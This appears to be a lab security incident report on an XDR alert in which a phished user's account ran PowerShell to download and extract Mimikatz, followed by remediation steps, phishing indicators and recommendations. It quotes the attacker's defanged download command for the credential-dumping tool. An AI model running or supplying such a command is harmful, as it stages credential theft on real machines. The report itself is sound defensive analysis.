# Incident Summary

Time: Jan 27, 2026, 12:12:13 PM UTC
Device: myohset-vm
Host: 172.16.0.4
User: Jenny Smith
User Account : jenny@30dayproject.onmicrosoft.com
IOC IP: 167.179.90.72
IOC IP Country : Japan
PowerShell Command Executed:
    iwr "hxxps[://github[.com/gentilkiwi/mimikatz/releases/download/2[.]2[.]0-20220919/mimikatz_trunk[.]zip" -Outfile "$env:TEMP\mimikatz.zip"; 
Expand-Archive "$env:TEMP\mimikatz.zip" -DestinationPath "$env:TEMP\mimikatz_extracted" -Force

Alert: Hands-on keyboard attack launched from a compromised account
Investigation Status: Remediated
Automated Investigation and Response: Status changed from New to Resolved on Jan 27, 2026, 12:22:53 PM UTC
Suspicious Folder Path:c:\users\jennysmith\appdata\local\temp\mimikatz_extracted\
Suspicious File Name :c:\users\jennysmith\appdata\local\temp\mimikatz.zip

### Summary

On January 27, 2026 (UTC), Microsoft XDR generated an alert indicating that a hands-on keyboard attack was launched from the compromised account of Jenny Smith on host myohset-vm.
The investigation confirmed that Jenny Smith’s account was compromised through a phishing email sent from the attacker identity “Endy Eanny.” After gaining access, the attacker attempted to download and execute Mimikatz to harvest credentials from the device.
Microsoft Defender for Endpoint detected the malicious activity, contained the threat, and automatically remediated the device.




Validation Steps
1. Enter a Live Response session on the affected device.
2. Navigate to: c:\users\jennysmith\appdata\local\temp\mimikatz_extracted\
3. Verify that the folder mimikatz_extracted and all related files have been removed.
4. Confirm no remaining artifacts such as mimikatz.zip or extracted binaries.

## Additional Findings

A domain-wide query identified two users who received the phishing email.
The malicious domain and sender were blocked, and appropriate actions were taken.
Phishing Details:
Source IP: 109.224.244.25
Sender Email: endyganny@protonmail.com (Enddy Eanny)
Display Name: Endy Eanny
Subject: Invoice is Ready for Viewing - 3748291
Recipients:
• 	bob@30dayproject.onmicrosoft.com
• 	jenny@30dayproject.onmicrosoft.com
User Actions:
• 	Bob: Reported the email as phishing
• 	Jenny: Clicked the link, resulting in account compromise

## Recommendations

- Continue monitoring Jenny Smith’s account for unusual activity.
- Enforce password reset and MFA revalidation for affected users.
- Conduct phishing awareness training for all employees.
- Review email filtering rules to strengthen detection of similar phishing attempts.
- Validate that no additional persistence mechanisms or lateral movement occurred.
- Ensure all endpoints have the latest security updates and Defender signatures.
- Perform a full system scan using Microsoft Defender Antivirus on the compromised device to verify that no additional malware, credential‑harvesting tools, or persistence mechanisms are present.


  



